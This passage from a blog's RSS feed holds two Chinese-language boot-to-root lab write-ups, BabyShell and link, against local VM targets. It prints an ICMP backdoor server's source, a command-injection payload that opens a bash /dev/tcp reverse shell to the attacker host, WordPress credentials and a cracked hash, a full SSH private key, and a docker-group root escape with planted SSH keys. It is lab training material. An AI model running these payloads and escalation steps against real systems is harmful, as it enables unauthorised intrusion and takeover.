|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|_  /backup.zip: Possible backup
MAC Address: 08:00:27:FE:B7:5D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 37.38 seconds

```
发现备份文件，有些内容被删了，不过大体可以命令执行
```
┌──(root㉿kali)-[/tmp/test]
└─# cat icmp.py 
#!/usr/bin/env python3
import os
import sys
import socket
import struct
import time
import subprocess
import signal
import threading
from scapy.all import ICMP, IP, Raw, send, sniff, Ether
import base64

TRIGGER_SEQUENCE = b'Mazesec'
LISTEN_INTERFACE = 'enp0s3'
SERVER_IP = '0.0.0.0'

class ICMPServer:
    def __init__(self):
        self.running = True
        self.client_ips = {}
    
    def signal_handler(self, sig, frame):
        print('\n[!] Stopping server...')
        self.running = False
        sys.exit(0)
    
    def execute_command_as_user(self, command, uid=1000, timeout=30):
    
    def parse_icmp_command(self, packet_data):
        try:
            trigger_len = len(TRIGGER_SEQUENCE)
            if len(packet_data) &lt; trigger_len + 4:
                return None
            
            if packet_data[:trigger_len] != TRIGGER_SEQUENCE:
                return None
            
            cmd_len = struct.unpack('&gt;I', packet_data[trigger_len:trigger_len+4])[0]
            
            if cmd_len &lt;= 0 or cmd_len &gt; 4096:
                return None
            
            if len(packet_data) &lt; trigger_len + 4 + cmd_len:
                return None
                
            command = packet_data[trigger_len+4:trigger_len+4+cmd_len].decode('utf-8', errors='ignore')
            return command
            
        except Exception as e:
            print(f'[-] Parse error: {e}')
            return None
    
    def create_icmp_response(self, original_packet, result):
        try:
            result_bytes = result.encode('utf-8') if isinstance(result, str) else result
            result_len = len(result_bytes)
            trigger_len = len(TRIGGER_SEQUENCE)
            
            payload = TRIGGER_SEQUENCE
            payload += struct.pack('&gt;I', result_len)
            payload += result_bytes
            
            response = IP(dst=original_packet[IP].src) / \
                      ICMP(type=0, id=original_packet[ICMP].id, seq=original_packet[ICMP].seq) / \
                      Raw(load=payload)
            
            return response
            
        except Exception as e:
            print(f'[-] Response creation error: {e}')
            return None
    
    def handle_icmp_packet(self, packet):
        if not self.running:
            return
        
        try:
            if packet.haslayer(ICMP) and packet[ICMP].type == 8:
                src_ip = packet[IP].src
                
                if packet.haslayer(Raw):
                    icmp_data = bytes(packet[Raw].load)
                    
                    command = self.parse_icmp_command(icmp_data)
                    
                    if command:
                        print(f'[+] Command from {src_ip}: {command}')
                        
                        # 以UID 1000执行命令
                        result = self.execute_command_as_user(command, 1000)
                        print(f'[+] Result length: {len(result)}')
                        
                        # 以root权限发送ICMP响应
                        response = self.create_icmp_response(packet, result)
                        if response:
                            send(response, verbose=0)
                            print(f'[+] Response sent to {src_ip}')
                        
                        self.client_ips[src_ip] = time.time()
                    
        except Exception as e:
            print(f'[-] Packet handling error: {e}')
    
    def start_server(self):
        
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
def main():
    server = ICMPServer()
    server.start_server()

if __name__ == '__main__':
    main()
```
## 2.zero
exp拿到反弹shell，交互很有限弹个正常shell到2332端口
```
┌──(root㉿kali)-[/tmp/test]
└─# python3 ez.py 192.168.2.9 
[*] Testing connection to 192.168.2.9...
[→] Sending: whoami
[←] Response received (5 bytes)
[+] Backdoor active! Current user: zero

[*] Gathering system information...
[→] Sending: id
[←] Response received (48 bytes)

=== id ===
uid=1000(zero) gid=1000(zero) groups=1000(zero)

[→] Sending: uname -a
[←] Response received (87 bytes)

=== uname -a ===
Linux BabyShell 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU/Linux

[→] Sending: pwd
[←] Response received (2 bytes)

=== pwd ===
/

[→] Sending: ls -la
[←] Response received (6 bytes)

=== ls -la ===
ls -la
[→] Sending: cat /etc/passwd | head -20
[←] Response received (1016 bytes)

=== cat /etc/passwd | head -20 ===
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin

[→] Sending: ip addr show
[←] Response received (817 bytes)

=== ip addr show ===
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:fe:b7:5d brd ff:ff:ff:ff:ff:ff
    inet 192.168.2.9/24 brd 192.168.2.255 scope global dynamic enp0s3
       valid_lft 80142sec preferred_lft 80142sec
    inet6 240e:33d:3d:28b1:a00:27ff:fefe:b75d/64 scope global dynamic mngtmpaddr 
       valid_lft 256115sec preferred_lft 169715sec
    inet6 fe80::a00:27ff:fefe:b75d/64 scope link 
       valid_lft forever preferred_lft forever

[→] Sending: ps aux | head -10
[←] Response received (795 bytes)

=== ps aux | head -10 ===
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.5  98848 10236 ?        Ss   00:23   0:00 /sbin/init
root           2  0.0  0.0      0     0 ?        S    00:23   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I&lt;   00:23   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I&lt;   00:23   0:00 [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I&lt;   00:23   0:00 [kworker/0:0H-kblockd]
root           8  0.0  0.0      0     0 ?        I&lt;   00:23   0:00 [mm_percpu_wq]
root           9  0.0  0.0      0     0 ?        S    00:23   0:00 [ksoftirqd/0]
root          10  0.0  0.0      0     0 ?        I    00:23   0:00 [rcu_sched]
root          11  0.0  0.0      0     0 ?        I    00:23   0:00 [rcu_bh]

[*] Starting interactive ICMP shell (type 'exit' to quit)
icmp-shell&gt;
```
### shell优化


```
┌──(root㉿kali)-[/tmp/test]
└─# nc -lvvp 2332                    
listening on [any] 2332 ...
192.168.2.5: inverse host lookup failed: Unknown host
connect to [192.168.2.5] from (UNKNOWN) [192.168.2.5] 33456
bash: cannot set terminal process group (341): Inappropriate ioctl for device
bash: no job control in this shell
zero@BabyShell:/$ python3 -c 'import pty;pty.spawn('/bin/bash')'
python3 -c 'import pty;pty.spawn('/bin/bash')'
zero@BabyShell:/$ export SHELL=/bin/bash
export SHELL=/bin/bash
zero@BabyShell:/$ export TERM=xterm-256color
export TERM=xterm-256color
zero@BabyShell:/$ ^Z
zsh: suspended  nc -lvvp 2332
                                                                                                              
┌──(root㉿kali)-[/tmp/test]
└─# stty -a             
speed 38400 baud; rows 24; columns 110; line = 0;
intr = ^C; quit = ^\; erase = ^H; kill = ^U; eof = ^D; eol = &lt;undef&gt;; eol2 = &lt;undef&gt;; swtch = &lt;undef&gt;;
start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl -ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc

┌──(root㉿kali)-[/tmp/test]
└─# stty raw -echo;fg
[1]  + continued  nc -lvvp 2332
                               reset

```

## 3.root

opt下发现完整icmp服务端源码，具体关注execute_command_as_user函数内容
```
def execute_command_as_user(self, command, uid=1000, timeout=30):
        try:
            # 使用sudo以指定用户执行命令
            result = subprocess.check_output(
                f'sudo -u zero bash -c '{command}'',
                shell=True,
                stderr=subprocess.STDOUT,
                timeout=timeout,
                text=True
            )
            return result
        except subprocess.TimeoutExpired:
            return f'Error: Command timeout'
        except subprocess.CalledProcessError as e:
            return f'Error: Exit code {e.returncode}\nOutput: {e.output}'
        except Exception as e:
            return f'Error: {str(e)}'
            
```
```
可以看到f'sudo -u zero bash -c '{command}''是root执行的而且没有过滤，那就直接拼接拿shell就行
传入command ';whoami'

┌──(root㉿kali)-[/tmp/test]
└─# python3 ez.py 192.168.2.9
[*] Testing connection to 192.168.2.9...
[→] Sending: ';whoami'
[←] Response received (5 bytes)
[+] Backdoor active! Current user: root
```
能成功执行那就开始反弹shell

反弹报错fd的可以看这个博客
[解决ubuntu crontab反弹shell失败的问题 | m3lon](https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/)

`payload:';bash -c 'bash -i  &gt;&amp;/dev/tcp/192.168.2.5/2333 0&gt;&amp;1''`

```
┌──(root㉿kali)-[/tmp/test]
└─# python3 exp.py 192.168.2.9         
[*] Testing connection to 192.168.2.9...
[→] Sending: ';bash -c 'bash -i  &gt;&amp;/dev/tcp/192.168.2.5/2333 0&gt;&amp;1''
[←] Response received (54 bytes)
[+] Backdoor active! Current user: ';bash -c 'bash -i  &gt;&amp;/dev/tcp/192.168.2.5/2333 0&gt;&amp;1''


┌──(root㉿kali)-[~]
└─# nc -lvvp 2333
listening on [any] 2333 ...
192.168.2.5: inverse host lookup failed: Unknown host
connect to [192.168.2.5] from (UNKNOWN) [192.168.2.5] 42254
bash: cannot set terminal process group (341): Inappropriate ioctl for device
bash: no job control in this shell
root@BabyShell:/# 

```
接到root shell。</description><guid isPermaLink="true">https://faabbi.github.io/post/BabyShell-MJ.html</guid><pubDate>Mon, 10 Nov 2025 10:38:09 +0000</pubDate></item><item><title>link-MJ</title><link>https://faabbi.github.io/post/link-MJ.html</link><description>## 1.信息收集
```
┌──(root㉿kali)-[/tmp/test]
└─# nmap -sn 192.168.2.0/24               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 09:29 EDT
Nmap scan report for 192.168.2.1
Host is up (0.0035s latency).
MAC Address: B4:5F:84:E2:C0:16 (zte)
Nmap scan report for 192.168.2.3
Host is up (0.035s latency).
MAC Address: 6A:80:FA:9D:CC:1F (Unknown)
Nmap scan report for 192.168.2.6
Host is up (0.000065s latency).
MAC Address: C8:8A:9A:D9:80:32 (Intel Corporate)
Nmap scan report for 192.168.56.164 (192.168.2.15)
Host is up (0.00013s latency).
MAC Address: 08:00:27:C0:73:27 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.2.14
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 15.14 seconds
```
开放22和80端口
```
┌──(root㉿kali)-[/tmp/test]
└─# nmap --min-rate 10000 -p- 192.168.2.15
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 09:30 EDT
Nmap scan report for 192.168.56.164 (192.168.2.15)
Host is up (0.00055s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
MAC Address: 08:00:27:C0:73:27 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap done: 1 IP address (1 host up) scanned in 5.43 seconds
```
基本服务探测，发现.git目录，可能存在git泄露
```
┌──(root㉿kali)-[/tmp/test]
└─# nmap -sV -sC -O -p22,80 192.168.2.15  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 09:31 EDT
Nmap scan report for 192.168.56.164 (192.168.2.15)
Host is up (0.00093s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: RedBean&amp;#039;s Blog
|_http-server-header: Apache/2.4.62 (Debian)
|_http-generator: WordPress 6.7
| http-git: 
|   192.168.2.15:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: wordpress 
MAC Address: 08:00:27:C0:73:27 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.74 seconds
```

githack拉到本地，在wordpress.sql文件和wp-config文件中发现wordpress密码hash
与数据库凭据，破解hash获取明文密码

Wordpress:      Yliken/ichliebedich
Mysql:          root/root

```
INSERT INTO `wp_users` VALUES (1,'Yliken','$P$B.58QLT1rmg1yTSJN7Qzzkoi9WnXF9.','yliken','Yliken@RedBean.com','http://192.168.56.164','2025-10-28 16:08:56','',0,'Yliken');

/** Database username */
define( 'DB_USER', 'root' );
/** Database password */
define( 'DB_PASSWORD', 'root' );
```

## 2.web渗透

&lt;img width='2554' height='1064' alt='Image' src='https://github.com/user-attachments/assets/1dd81a2e-60dd-4da1-8ad2-3d9735f7aa31' /&gt;


登录到后台，修改插件获取反弹shell，禁用插件修改，然后再启用，不然会有报错

&lt;img width='2559' height='1164' alt='Image' src='https://github.com/user-attachments/assets/2374e149-2847-4493-afcf-58029a3b1078' /&gt;


## 3.提权

提升到完整交互性shell
rlwrap nc -lvvp 2332  (这样包裹nc，可能会在vim时出现乱码，不哦那个rlwrap经过以下处理一样能够翻命令)
```
┌──(root㉿kali)-[~]
└─# nc -lvvp 2332
listening on [any] 2332 ...
192.168.2.14: inverse host lookup failed: Unknown host
connect to [192.168.2.14] from (UNKNOWN) [192.168.2.14] 41966
bash: cannot set terminal process group (414): Inappropriate ioctl for device
bash: no job control in this shell
www-data@link:/var/www/html/wp-content/plugins/akismet$ /usr/bin/script -qc /bin/bash
&lt;tent/plugins/akismet$ /usr/bin/script -qc /bin/bash    
www-data@link:/var/www/html/wp-content/plugins/akismet$ ^Z
zsh: suspended  nc -lvvp 2332
                                                                                                         
┌──(root㉿kali)-[~]
└─# stty raw -echo;fg
[1]  + continued  nc -lvvp 2332
                               reset
reset: unknown terminal type unknown
Terminal type? xterm           #询问终端类型在本地终端echo $TERM查看
www-data@link:/var/www/html/wp-content/plugins/akismet$ export SHELL=/bin/bash
www-data@link:/var/www/html/wp-content/plugins/akismet$ export
TERM=xterm-256color
www-data@link:/var/www/html/wp-content/plugins/akismet$ stty rows 19 columns 87;                    #尺寸大小在本地终端stty -a查看

```
### Yliken

查看端口发现有只对本地开放的8080端口
```
State      Recv-Q     Send-Q         Local Address:Port          Peer Address:Port     
LISTEN     0          128                  0.0.0.0:22                 0.0.0.0:*        
LISTEN     0          80                 127.0.0.1:3306               0.0.0.0:* 

LISTEN     0          128                127.0.0.1:8080               0.0.0.0:*        
LISTEN     0          128                     [::]:22                    [::]:*        
LISTEN     0          128                        *:80                       *:*
```

socket转发出去
```
www-data@link:/$ socket TCP-LISTEN:9999,fork TCP:127.0.0.1:8080 &amp;
```

访问发现是fileBrower

&lt;img width='2092' height='366' alt='Image' src='https://github.com/user-attachments/assets/4a0497cc-3a30-48c4-8e9e-ba4f79693323' /&gt;


查看进程发现是yliken权限启动
```
www-data@link:/app/yliken$ ps -aux | grep yliken
yliken       321  0.0  0.3 1231760 7876 ?        Ssl  07:43   0:00 /home/yliken/fileBrower
www-data    1839  0.0  0.0   3176   636 pts/7    S+   10:04   0:00 grep yliken
```

通过ln链接然后web访问获取yliken用户家目录敏感文件
```
www-data@link:/app/yliken$ ln -s /home/yliken/ ./temp
```
得到私钥
```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
user.txt
```
┌──(root㉿kali)-[~]
└─# ssh -i /root/id_rsa yliken@192.168.2.15             
Linux link 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Oct 31 10:08:19 2025 from 192.168.2.14
$ bash
yliken@link:~$ cat user.txt
flag{2b6d0f77e398476ede85fe65586bf33c}

```

### root
ssh连上靶机发现yliken用户在docker组，可以考虑docker逃逸提权

```
yliken@link:~$ id
uid=1000(yliken) gid=1000(yliken) groups=1000(yliken),998(docker)
```
利用docker挂载主机根目录
```
yliken@link:~$ docker images
REPOSITORY    TAG       IMAGE ID       CREATED        SIZE
hello-world   latest    1b44b5a3e06a   2 months ago   10.1kB
ubuntu        18.04     f9a80a55f492   2 years ago    63.2MB
yliken@link:~$ docker run -v /:/tmp -it ubuntu:18.04 bash
root@48c9bad9b420:/# chroot /tmp
# bash
root@48c9bad9b420:/# 
```
后面提权方式很多，写入ssh公钥，创建新root用户，修改passwd文件，给bash设置s位，修改root密码等，这里方法写入ssh公钥


```
root@48c9bad9b420:~/.ssh# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQClUpaEKHlyG1yCMmNTl3nbj+ZzfgpxcvmHWEAV0CMmFZ+mJ/1m5hRfeJ/waaLTE+Ov+woDZaRHfXPESP3W+3QsQj+AMeVFLQ+eQv0W+PhCIWBI18jtJhImEvC6xWM5XNY9tG/4moICziMJ6b81hYevmvEGVI8RKR5IK6ikXHmPXvRZxJmaRltDIFXDQgdgLHHEjXbQ0DAeSRjCeSk+9gKHIX+KQ8qcDX+Y1z15A/PgMzQ0QvxP7Yoezfqr4ZwYI3ohpuOaeGXq/9D5Sh1LU7l7uG7BnZWaTRfptcbWFIohEzVXcW2+C+h8LuSgWxQPT+t6tZ7kfKYk6Cm4XgTXLZLMxOdoG40x4JNk11xkMEr4RYZoIArlPP3y3nL1hvB6lgcVzyH0Yrd2QBUzJmZ2ar9IdRJZf0ZclmJ/VOy527Bm6bksiKDzhBZOgD1xYL/2MkiYDS01li3FHIh1ku17tnXWi64RDE2eGOvQFeL8XC53YZ9rlsVSJ7SOs05mDT1DPpwTMYP2S9Aw+HTNlwJayaRkXd28PS22YSiUyxkbYu83aHCibCfQhpfIz9FrVVJjg2Rri/vETOBNARuLzZci7UkNe4LExUUdTw6UsaAF9G9+Ku/qIq7CRuFuqURsT7j/MYVv1/5ylobcYfk+2wqW0isiawr7qrF5q0NRq/+abarB6Q== root@192.168.2.15' &gt;&gt; authorized_keys
root@48c9bad9b420:~/.ssh# ls
authorized_keys
```

root.txt
```
┌──(root㉿kali)-[~]
└─# ssh -i /tmp/id_rsa root@192.168.2.15                
Linux link 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct 29 01:17:44 2025 from 192.168.56.1
root@link:~# cat root.txt
flag{e6a6e8eac98579c8d826d07df3c132bc}
```
。</description><guid isPermaLink="true">https://faabbi.github.io/post/link-MJ.html</guid><pubDate>Mon, 10 Nov 2025 09:27:35 +0000</pubDate></item></channel></rss>